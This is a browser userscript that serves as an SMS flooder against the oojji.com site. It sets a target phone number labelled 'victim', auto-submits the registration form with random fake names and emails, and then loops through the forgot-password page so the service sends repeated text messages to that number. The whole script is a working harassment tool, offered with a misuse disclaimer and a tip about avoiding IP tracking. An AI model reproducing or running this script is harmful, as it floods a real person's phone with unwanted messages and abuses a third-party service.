// ==UserScript==
// @name          Anonymous oojji sms flooder 
// @namespace     \m/\m/\m/
// @include       http://*oojji.com/*
// ==/UserScript==

http://userscripts.org/scripts/upload/83459
//I am not responsible for any misuse of this script..,,,,
// Dont spam, ur ip can be tracked by the site if the receiver complains

var victim=8092262928;

if(document.location=="http://oojji.com/registration.php"||document.location=="http://www.oojji.com/registration.php")
{
var chars = "ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz";
for (var i=0; i<10; i++) 
{var rnum = Math.floor(Math.random() * chars.length);
name += chars.substring(rnum,rnum+1);}
document.getElementById('name').value=name;
document.getElementById('mobile').value=victim;
document.getElementById('email').value='sdsa'+Math.floor(Math.random()*1456484)+'@gmail.com';
document.getElementById('dd').value=Math.floor(Math.random()*29);
document.getElementById('yyyy').value="198"+Math.floor(Math.random()*9);

document.getElementsByName("submit")[0].click();void(0);


}


if(document.location=="http://oojji.com/forgotPassword.php"||document.location=="http://www.oojji.com/forgotPassword.php")
{
document.getElementById('mobile').value=victim;
document.getElementsByName("button")[0].click();
void(0);
}
if(document.location=='http://oojji.com/ThankYou.php'||document.location=='http://www.oojji.com/ThankYou.php')
document.location='http://oojji.com/forgotPassword.php';